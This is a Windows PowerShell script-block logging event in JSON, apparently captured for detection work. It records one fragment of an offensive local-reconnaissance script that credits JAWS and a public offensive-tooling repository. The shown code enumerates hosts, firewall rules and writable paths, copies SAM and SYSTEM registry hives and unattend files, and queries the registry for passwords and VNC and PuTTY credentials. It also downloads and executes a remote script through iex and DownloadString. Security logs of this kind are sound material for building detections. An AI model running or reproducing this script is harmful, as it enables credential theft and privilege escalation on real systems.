{
  "Event": {
    "#attributes": {
      "xmlns": "http://schemas.microsoft.com/win/2004/08/events/event"
    },
    "System": {
      "Provider": {
        "#attributes": {
          "Name": "Microsoft-Windows-PowerShell",
          "Guid": "A0C1853B-5C40-4B15-8766-3CF1C58F985A"
        }
      },
      "EventID": 4104,
      "Version": 1,
      "Level": 3,
      "Task": 2,
      "Opcode": 15,
      "Keywords": "0x0",
      "TimeCreated": {
        "#attributes": {
          "SystemTime": "2025-12-23T12:25:40.169046Z"
        }
      },
      "EventRecordID": 3159,
      "Correlation": {
        "#attributes": {
          "ActivityID": "B908F131-6DEE-0001-A801-39B9EE6DDC01"
        }
      },
      "Execution": {
        "#attributes": {
          "ProcessID": 23052,
          "ThreadID": 9920
        }
      },
      "Channel": "Microsoft-Windows-PowerShell/Operational",
      "Computer": "swachchhanda",
      "Security": {
        "#attributes": {
          "UserID": "S-1-5-21-2555720767-1205513275-3893774561-1001"
        }
      }
    },
    "EventData": {
      "MessageNumber": 5,
      "MessageTotal": 14,
      "ScriptBlockText": "et-LocalUser | ft Name,Enabled,LastLogon\r\n        Write-Host -ForegroundColor Yellow '-------> Getting local Accounts/Users + Password policy'\r\n      net accounts\r\n        Get-LocalGroup | ft Name\r\n      Write-Host -ForegroundColor Yellow '-------> Getting network interfaces, route information, Arp table'\r\n        Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address\r\n        Get-DnsClientServerAddress -AddressFamily IPv4 | ft \r\n        Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex \r\n        Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,LinkLayerAddress,State \r\n        netstat -ano \r\n        Get-ChildItem 'HKLM:\\SOFTWARE\\Microsoft\\NET Framework Setup\\NDP' -Recurse | Get-ItemProperty -Name Version, Release -ErrorAction 0 | where { $_.PSChildName -match '^(?!S)\\p{L}'} | select PSChildName, Version, Release \r\n        Write-Host -ForegroundColor Yellow '-------> Getting Shares'\r\n      net share\r\n      Write-Host -ForegroundColor Yellow '-------> Getting hosts file content'\r\n      get-content $env:windir\\System32\\drivers\\etc\\hosts | out-string \r\n      Get-ChildItem -Path HKLM:\\Software\\*\\Shell\\open\\command\\ \r\n    }\r\n    #Stolen and integrated from 411Hall's JAWS\r\n  Write-Host -ForegroundColor Yellow 'Searching for files with Full Control and Modify Access'\r\n  Function Get-FireWallRule\r\n          {\r\n        Param ($Name, $Direction, $Enabled, $Protocol, $profile, $action, $grouping)\r\n        $Rules=(New-object -comObject HNetCfg.FwPolicy2).rules\r\n        If ($name)      {$rules= $rules | where-object {$_.name     -like $name}}\r\n        If ($direction) {$rules= $rules | where-object {$_.direction  -eq $direction}}\r\n        If ($Enabled)   {$rules= $rules | where-object {$_.Enabled    -eq $Enabled}}\r\n        If ($protocol)  {$rules= $rules | where-object {$_.protocol   -eq $protocol}}\r\n        If ($profile)   {$rules= $rules | where-object {$_.Profiles -bAND $profile}}\r\n        If ($Action)    {$rules= $rules | where-object {$_.Action     -eq $Action}}\r\n        If ($Grouping)  {$rules= $rules | where-object {$_.Grouping -like $Grouping}}\r\n        $rules\r\n      }\r\n\t    \r\n      if(!$consoleoutput){Get-firewallRule -enabled $true | sort direction,name | format-table -property Name,localPorts,direction | out-string -Width 4096 >> \"$currentPath\\LocalRecon\\Firewall_Rules.txt\"}else{Get-firewallRule -enabled $true | sort direction,name | format-table -property Name,localPorts,direction | out-string -Width 4096} \r\n\t    \r\n      $output = \" Files with Full Control and Modify Access`r`n\"\r\n      $output = $output +  \"-----------------------------------------------------------`r`n\"\r\n          $files = get-childitem C:\\\r\n          foreach ($file in $files)\r\n          {\r\n              try {\r\n                  $output = $output +  (get-childitem \"C:\\$file\" -include *.ps1,*.bat,*.com,*.vbs,*.txt,*.html,*.conf,*.rdp,.*inf,*.ini -recurse -EA SilentlyContinue | get-acl -EA SilentlyContinue | select path -expand access | \r\n                  where {$_.identityreference -notmatch \"BUILTIN|NT AUTHORITY|EVERYONE|CREATOR OWNER|NT SERVICE\"} | where {$_.filesystemrights -match \"FullControl|Modify\"} | \r\n                  ft @{Label=\"\";Expression={Convert-Path $_.Path}}  -hidetableheaders -autosize | out-string -Width 4096)\r\n                  }\r\n                  catch{$output = $output +   \"`nFailed to read more files`r`n\"}\r\n            }\r\n      Write-Host -ForegroundColor Yellow 'Searching for folders with Full Control and Modify Access'\r\n      $output = $output +  \"-----------------------------------------------------------`r`n\"\r\n          $output = $output +  \" Folders with Full Control and Modify Access`r`n\"\r\n          $output = $output +  \"-----------------------------------------------------------`r`n\"\r\n          $folders = get-childitem C:\\\r\n          foreach ($folder in $folders)\r\n          {\r\n              try \r\n            {\r\n                $output = $output +  (Get-ChildItem -Recurse \"C:\\$folder\" -EA SilentlyContinue | ?{ $_.PSIsContainer} | get-acl  | select path -expand access |  \r\n                where {$_.identityreference -notmatch \"BUILTIN|NT AUTHORITY|CREATOR OWNER|NT SERVICE\"}  | where {$_.filesystemrights -match \"FullControl|Modify\"} | \r\n                select path,filesystemrights,IdentityReference |  ft @{Label=\"\";Expression={Convert-Path $_.Path}}  -hidetableheaders -autosize | out-string -Width 4096)\r\n              }\r\n            catch \r\n          {\r\n              $output = $output +  \"`nFailed to read more folders`r`n\"\r\n            }\r\n            }\r\n      if(!$consoleoutput){$output >> \"$currentPath\\LocalRecon\\Files_and_Folders_with_Full_Modify_Access.txt\"}else{Write-Host \"------->JAWS Recon\";$output}\r\n\t    \r\n   Write-Host -ForegroundColor Yellow '-------> Checking for potential sensitive user files'\r\n   if(!$consoleoutput){get-childitem \"C:\\Users\\\" -recurse -Include *.zip,*.rar,*.7z,*.gz,*.conf,*.rdp,*.kdbx,*.crt,*.pem,*.ppk,*.txt,*.xml,*.vnc.*.ini,*.vbs,*.bat,*.ps1,*.cmd -EA SilentlyContinue | %{$_.FullName } | out-string >> \"$currentPath\\LocalRecon\\Potential_Sensitive_User_Files.txt\"}else{get-childitem \"C:\\Users\\\" -recurse -Include *.zip,*.rar,*.7z,*.gz,*.conf,*.rdp,*.kdbx,*.crt,*.pem,*.ppk,*.txt,*.xml,*.vnc.*.ini,*.vbs,*.bat,*.ps1,*.cmd -EA SilentlyContinue | %{$_.FullName } | out-string} \r\n\t \r\n   Write-Host -ForegroundColor Yellow '-------> Checking AlwaysInstallElevated'\r\n   $HKLM = \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\"\r\n     $HKCU =  \"HKCU:\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\"\r\n     if (($HKLM | test-path) -eq \"True\") \r\n     {\r\n         if (((Get-ItemProperty -Path $HKLM -Name AlwaysInstallElevated).AlwaysInstallElevated) -eq 1)\r\n         {\r\n            if(!$consoleoutput){echo \"AlwaysInstallElevated enabled on this host!\" >> \"$currentPath\\Vulnerabilities\\AlwaysInstallElevatedactive.txt\"}else{Write-Host -ForegroundColor Red \"AlwaysInstallElevated enabled on this host!\"}\r\n         }\r\n     }\r\n     if (($HKCU | test-path) -eq \"True\") \r\n     {\r\n         if (((Get-ItemProperty -Path $HKLM -Name AlwaysInstallElevated).AlwaysInstallElevated) -eq 1)\r\n         {\r\n            if(!$consoleoutput){echo \"AlwaysInstallElevated enabled on this host!\" >> \"$currentPath\\Vulnerabilities\\AlwaysInstallElevatedactive.txt\"}else{Write-Host -ForegroundColor Red \"AlwaysInstallElevated enabled on this host!\"}\r\n         }\r\n     }\r\n   Write-Host -ForegroundColor Yellow '-------> Checking if Netbios is active'\r\n   $EnabledNics= @(gwmi -query \"select * from win32_networkadapterconfiguration where IPEnabled='true'\")\r\n\r\n   $OutputObj = @()\r\n         foreach ($Network in $EnabledNics) \r\n       {\r\n        If($network.tcpipnetbiosoptions) \r\n        {\t\r\n          $netbiosEnabled = [bool]$network\r\n         if ($netbiosEnabled){Write-Host 'Netbios is active, vulnerability found.'; echo \"Netbios Active, check localrecon folder for network interface Info\" >> \"$currentPath\\Vulnerabilities\\NetbiosActive.txt\"}\r\n        }\r\n        $nic = gwmi win32_networkadapter | where {$_.index -match $network.index}\r\n        $OutputObj  += @{\r\n      Nic = $nic.netconnectionid\r\n      NetBiosEnabled = $netbiosEnabled\r\n    }\r\n   }\r\n   $out = $OutputObj | % { new-object PSObject -Property $_} | select Nic, NetBiosEnabled| ft -auto\r\n   if(!$consoleoutput){$out >> \"$currentPath\\LocalRecon\\NetbiosInterfaceInfo.txt\"}else{$out}\r\n\t    \r\n   Write-Host -ForegroundColor Yellow '-------> Checking if IPv6 is active (mitm6 attacks)'\r\n   $IPV6 = $false\r\n   $arrInterfaces = (Get-WmiObject -class Win32_NetworkAdapterConfiguration -filter \"ipenabled = TRUE\").IPAddress\r\n   foreach ($i in $arrInterfaces) {$IPV6 = $IPV6 -or $i.contains(\":\")}\r\n   if(!$consoleoutput){if ($IPV6){Write-Host 'IPv6 enabled, thats another vulnerability (mitm6)'; echo \"IPv6 enabled, check all interfaces for the specific NIC\" >> \"$currentPath\\Vulnerabilities\\IPv6_Enabled.txt\" }}else{if ($IPV6){Write-Host 'IPv6 enabled, thats another vulnerability (mitm6)'; echo \"IPv6 enabled, check all interfaces for the specific NIC\"}}\r\n\t \r\n   Write-Host -ForegroundColor Yellow '-------> Collecting installed Software informations'\r\n   if(!$consoleoutput){Get-Installedsoftware -Property DisplayVersion,InstallDate | out-string -Width 4096 >> \"$currentPath\\LocalRecon\\InstalledSoftwareAll.txt\"}else{Get-Installedsoftware -Property DisplayVersion,InstallDate | out-string -Width 4096}\r\n         \r\n   iex (new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/Creds/master/PowershellScripts/Invoke-Vulmap.ps1')\r\n   Write-Host -ForegroundColor Yellow '-------> Checking if Software is outdated and therefore vulnerable / exploitable'\r\n   if(!$consoleoutput){Invoke-Vulmap | out-string -Width 4096 >> \"$currentPath\\Vulnerabilities\\VulnerableSoftware.txt\"}else{Invoke-Vulmap | out-string -Width 4096}\r\n        \r\n            \r\n     # Collecting more information\r\n     Write-Host -ForegroundColor Yellow '-------> Checking for accesible SAM/SYS Files'\r\n     if(!$consoleoutput){\r\n        If (Test-Path -Path 'Registry::HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\SNMP'){Get-ChildItem -path 'Registry::HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\SNMP' -Recurse >> \"$currentPath\\LocalRecon\\SNMP.txt\"}            \r\n        If (Test-Path -Path %SYSTEMROOT%\\repair\\SAM){Write-Host -ForegroundColor Yellow \"SAM File reachable, looking for SYS?\";copy %SYSTEMROOT%\\repair\\SAM \"$currentPath\\Vulnerabilities\\SAM\"}\r\n        If (Test-Path -Path %SYSTEMROOT%\\System32\\config\\SAM){Write-Host -ForegroundColor Yellow \"SAM File reachable, looking for SYS?\";copy %SYSTEMROOT%\\System32\\config\\SAM \"$currentPath\\Vulnerabilities\\SAM\"}\r\n        If (Test-Path -Path %SYSTEMROOT%\\System32\\config\\RegBack\\SAM){Write-Host -ForegroundColor Yellow \"SAM File reachable, looking for SYS?\";copy %SYSTEMROOT%\\System32\\config\\RegBack\\SAM \"$currentPath\\Vulnerabilities\\SAM\"}\r\n        If (Test-Path -Path %SYSTEMROOT%\\System32\\config\\SAM){Write-Host -ForegroundColor Yellow \"SAM File reachable, looking for SYS?\";copy %SYSTEMROOT%\\System32\\config\\SAM \"$currentPath\\Vulnerabilities\\SAM\"}\r\n        If (Test-Path -Path %SYSTEMROOT%\\repair\\system){Write-Host -ForegroundColor Yellow \"SYS File reachable, looking for SAM?\";copy %SYSTEMROOT%\\repair\\system \"$currentPath\\Vulnerabilities\\SYS\"}\r\n        If (Test-Path -Path %SYSTEMROOT%\\System32\\config\\SYSTEM){Write-Host -ForegroundColor Yellow \"SYS File reachable, looking for SAM?\";copy %SYSTEMROOT%\\System32\\config\\SYSTEM \"$currentPath\\Vulnerabilities\\SYS\"}\r\n        If (Test-Path -Path %SYSTEMROOT%\\System32\\config\\RegBack\\system){Write-Host -ForegroundColor Yellow \"SYS File reachable, looking for SAM?\";copy %SYSTEMROOT%\\System32\\config\\RegBack\\system \"$currentPath\\Vulnerabilities\\SYS\"}\r\n     }\r\n     else\r\n     {\r\n        If (Test-Path -Path 'Registry::HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\SNMP'){Get-ChildItem -path 'Registry::HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\SNMP' -Recurse >> \"$currentPath\\LocalRecon\\SNMP.txt\"}            \r\n        If (Test-Path -Path %SYSTEMROOT%\\repair\\SAM){Write-Host -ForegroundColor Yellow \"SAM File reachable at %SYSTEMROOT%\\repair\\SAM\"}\r\n        If (Test-Path -Path %SYSTEMROOT%\\System32\\config\\SAM){Write-Host -ForegroundColor Yellow \"SAM File reachable at %SYSTEMROOT%\\System32\\config\\SAM, looking for SYS?\"}\r\n        If (Test-Path -Path %SYSTEMROOT%\\System32\\config\\RegBack\\SAM){Write-Host -ForegroundColor Yellow \"SAM File reachable at %SYSTEMROOT%\\System32\\config\\RegBack\\SAM, looking for SYS?\"}\r\n        If (Test-Path -Path %SYSTEMROOT%\\System32\\config\\SAM){Write-Host -ForegroundColor Yellow \"SAM File reachable at %SYSTEMROOT%\\System32\\config\\SAM, looking for SYS?\"}\r\n        If (Test-Path -Path %SYSTEMROOT%\\repair\\system){Write-Host -ForegroundColor Yellow \"SYS File reachable at %SYSTEMROOT%\\repair\\system, looking for SAM?\"}\r\n        If (Test-Path -Path %SYSTEMROOT%\\System32\\config\\SYSTEM){Write-Host -ForegroundColor Yellow \"SYS File reachable at %SYSTEMROOT%\\System32\\config\\SYSTEM, looking for SAM?\"}\r\n        If (Test-Path -Path %SYSTEMROOT%\\System32\\config\\RegBack\\system){Write-Host -ForegroundColor Yellow \"SYS File reachable at %SYSTEMROOT%\\System32\\config\\RegBack\\system, looking for SAM?\"} \r\n     }\r\n     Write-Host -ForegroundColor Yellow '-------> Checking Registry for potential passwords'\r\n     if(!$consoleoutput){\r\n     REG QUERY HKLM /F \"passwor\" /t REG_SZ /S /K >> \"$currentPath\\LocalRecon\\PotentialHKLMRegistryPasswords.txt\"\r\n     REG QUERY HKCU /F \"password\" /t REG_SZ /S /K >> \"$currentPath\\LocalRecon\\PotentialHKCURegistryPasswords.txt\"\r\n     }\r\n     else\r\n     {\r\n        REG QUERY HKLM /F \"passwor\" /t REG_SZ /S /K\r\n        REG QUERY HKCU /F \"password\" /t REG_SZ /S /K\r\n     }\r\n     Write-Host -ForegroundColor Yellow '-------> Checking sensitive registry entries..'\r\n     If (Test-Path -Path 'Registry::HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon')\r\n   {\r\n    if(!$consoleoutput){reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon\" >> \"$currentPath\\LocalRecon\\Winlogon.txt\"}else{reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon\"}\r\n   }\r\n     \r\n     if(!$consoleoutput){\r\n     If (Test-Path -Path 'Registry::HKEY_LOCAL_MACHINE\\SYSTEM\\Current\\ControlSet\\Services\\SNMP'){reg query \"HKLM\\SYSTEM\\Current\\ControlSet\\Services\\SNMP\" >> \"$currentPath\\LocalRecon\\SNMPParameters.txt\"}\r\n     If (Test-Path -Path 'Registry::HKEY_LOCAL_MACHINE\\SOFTWARE\\Software\\SimonTatham\\PuTTY\\Sessions'){reg query \"HKCU\\Software\\SimonTatham\\PuTTY\\Sessions\" >> \"$currentPath\\Vulnerabilities\\PuttySessions.txt\"}\r\n     If (Test-Path -Path 'Registry::HKEY_CURRENT_USER\\Software\\ORL\\WinVNC3\\Password'){reg query \"HKCU\\Software\\ORL\\WinVNC3\\Password\" >> \"$currentPath\\Vulnerabilities\\VNCPassword.txt\"}\r\n     If (Test-Path -Path 'Registry::HKEY_LOCAL_MACHINE\\SOFTWARE\\RealVNC\\WinVNC4'){reg query HKEY_LOCAL_MACHINE\\SOFTWARE\\RealVNC\\WinVNC4 /v password >> \"$currentPath\\Vulnerabilities\\RealVNCPassword.txt\"}\r\n\r\n     If (Test-Path -Path C:\\unattend.xml){copy C:\\unattend.xml \"$currentPath\\Vulnerabilities\\unattended.xml\"; Write-Host -ForegroundColor Yellow 'Unattended.xml Found, check it for passwords'}\r\n     If (Test-Path -Path C:\\Windows\\Panther\\Unattend.xml){copy C:\\Windows\\Panther\\Unattend.xml \"$currentPath\\Vulnerabilities\\unattended.xml\"; Write-Host -ForegroundColor Yellow 'Unattended.xml Found, check it for passwords'}\r\n     If (Test-Path -Path C:\\Windows\\Panther\\Unattend\\Unattend.xml){copy C:\\Windows\\Panther\\Unattend\\Unattend.xml \"$currentPath\\Vulnerabilities\\unattended.xml\"; Write-Host -ForegroundColor Yellow 'Unattended.xml Found, check it for passwords'}\r\n     If (Test-Path -Path C:\\Windows\\system32\\sysprep.inf){copy C:\\Windows\\system32\\sysprep.inf \"$currentPath\\Vulnerabilities\\sysprep.inf\"; Write-Host -ForegroundColor Yellow 'Sysprep.inf Found, check it for passwords'}\r\n     If (Test-Path -Path C:\\Windows\\system32\\sysprep\\sysprep.xml){copy C:\\Windows\\system32\\sysprep\\sysprep.xml \"$currentPath\\Vulnerabilities\\sysprep.inf\"; Write-Host -ForegroundColor Yellow 'Sysprep.inf Found, check it for passwords'}\r\n     }\r\n     else\r\n     {\r\n        If (Test-Path -Path 'Registry::HKEY_LOCAL_MACHINE\\SYSTEM\\Current\\ControlSet\\Services\\SNMP'){reg query \"HKLM\\SYSTEM\\Current\\ControlSet\\Services\\SNMP\"}\r\n        If (Test-Path -Path 'Registry::HKEY_LOCAL_MACHINE\\SOFTWARE\\Software\\SimonTatham\\PuTTY\\Sessions'){reg query \"HKCU\\Software\\SimonTatham\\PuTTY\\Sessions\"}\r\n        If (Test-Path -Path 'Registry::HKEY_CURRENT_USER\\Software\\ORL\\WinVNC3\\Password'){reg query \"HKCU\\Software\\ORL\\WinVNC3\\Password\"}\r\n        If (Test-Path -Path 'Registry::HKEY_LOCAL_MACHINE\\SOFTWARE\\RealVNC\\WinVNC4'){reg query HKEY_LOCAL_MACHINE\\SOFTWARE\\RealVNC\\WinVNC4 /v password}\r\n\r\n        If (Test-Path -Path C:\\unattend.xml){Write-Host -ForegroundColor Yellow 'Unattended.xml Found at C:\\unattend.xml, check it for passwords'}\r\n        If (Test-Path -Path C:\\Windows\\Panther\\Unattend.xml){Write-Host -ForegroundColor Yellow 'Unattended.xml Found at C:\\Windows\\Panther\\Unattend.xml, check it for passwords'}\r\n        If (Test-Path -Path C:\\Windows\\Panther\\Unattend\\Unattend.xml){Write-Host -ForegroundColor Yellow 'Unattended.xml Found at C:\\Windows\\Panther\\Unattend\\Unattend.xml, check it for passwords'}\r\n        If (Test-Path -Path C:\\Windows\\system32\\sysprep.inf){Write-Host -ForegroundColor Yellow 'Sysprep.inf Found at C:\\Windows\\system32\\sysprep.inf, check it for passwords'}\r\n        If (Test-Path -Path C:\\Windows\\system32\\sysprep\\sysprep.xml){Write-Host -ForegroundColor Yellow 'Sysprep.inf Found at C:\\Windows\\system32\\sysprep\\sysprep.xml, check it for passwords'}\r\n     }\r\n     \r\n     if(!$consoleoutput){Get-Childitem -Path C:\\inetpub\\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue >> \"$currentPath\\Vulnerabilities\\webconfigfiles.txt\"}else{Get-Childitem -Path C:\\inetpub\\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue}\r\n\t    \r\n   Write-Host -ForegroundCo",
      "ScriptBlockId": "0047f305-d1db-422c-a99f-b44ff657547e",
      "Path": ""
    }
  }
}
